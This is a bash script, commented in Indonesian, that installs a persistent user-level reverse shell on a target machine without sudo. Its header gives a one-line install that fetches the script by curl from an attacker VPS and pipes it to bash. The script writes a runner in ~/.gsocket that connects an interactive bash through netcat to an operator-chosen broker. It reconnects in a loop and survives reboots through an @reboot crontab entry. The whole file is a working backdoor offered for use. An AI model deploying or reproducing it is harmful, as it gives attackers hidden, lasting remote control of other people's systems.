#!/usr/bin/env bash
#
# install_user_revshell.sh
# Tanpa sudo: Pasang reverse shell di user-level (crontab @reboot).
#
# Cara pakai di Target (user biasa):
#   X="Secret1337" bash -c "$(curl -fsSL http://IP_VPS/install_user_revshell.sh)"
#
# Atau:
#   S="Secret1337" GH="IP_VPS" GP="5000" bash -c "$(curl -fsSL http://IP_VPS/install_user_revshell.sh)"
#
# Pastikan 'nc' sudah terpasang di Target (tidak bisa install tanpa sudo).

set -e

# Ambil SECRET dari environment X atau S
SECRET="${X:-$S}"
if [ -z "$SECRET" ]; then
  echo "[ERROR] SECRET tidak ditemukan di variabel X=... atau S=..."
  exit 1
fi

# Default broker
BROKER_HOST="${GH:-1.2.3.4}"   # Ganti 1.2.3.4 dengan IP/Domain VPS Anda, jika mau default
BROKER_PORT="${GP:-5000}"

# Pastikan netcat ada (kita tidak bisa install tanpa sudo).
if ! command -v nc >/dev/null 2>&1; then
  echo "[WARNING] 'nc' (netcat) tidak ditemukan di PATH. Pastikan sudah terinstal."
  echo "[WARNING] Reverse shell mungkin gagal!"
fi

# Buat folder ~/.gsocket/ kalau belum ada
mkdir -p "$HOME/.gsocket"

RUNNER="$HOME/.gsocket/runner.sh"

echo "[INFO] Membuat script runner di $RUNNER ..."
cat <<EOF > "$RUNNER"
#!/usr/bin/env bash
SECRET="${SECRET}"
BROKER_HOST="${BROKER_HOST}"
BROKER_PORT="${BROKER_PORT}"

while true
do
  # Kirim SECRET lalu jalankan bash -i, disambungkan ke broker:
  (echo "\$SECRET"; exec /bin/bash -i) | nc "\$BROKER_HOST" "\$BROKER_PORT"
  # Jika putus, tunggu 5 detik, lalu ulangi
  sleep 5
done
EOF

chmod +x "$RUNNER"

# Tambahkan baris @reboot di crontab user untuk menjalankan runner.sh
# Gunakan komentar unik (#GSOCKET_DAEMON) agar tidak dobel jika skrip dijalankan berkali-kali.
crontab -l 2>/dev/null | grep -v "#GSOCKET_DAEMON" > /tmp/cron_gsocket.$$
echo "@reboot /bin/bash \"$RUNNER\" #GSOCKET_DAEMON" >> /tmp/cron_gsocket.$$
crontab /tmp/cron_gsocket.$$
rm /tmp/cron_gsocket.$$

echo "[INFO] Menjalankan runner.sh di background sekarang..."
# Jalankan di background agar user tidak perlu menunggu
nohup /bin/bash "$RUNNER" >/dev/null 2>&1 &

echo "-----------------------------------------------"
echo "[SUKSES] Reverse shell daemon terpasang (user-level)."
echo "SECRET     : $SECRET"
echo "BROKER     : $BROKER_HOST:$BROKER_PORT"
echo "Script     : $RUNNER"
echo "Crontab    : @reboot /bin/bash \"$RUNNER\""
echo
echo "Proses akan mencoba connect ke broker secara terus-menerus."
echo "Otomatis start lagi setelah reboot, tanpa sudo."
echo "-----------------------------------------------"
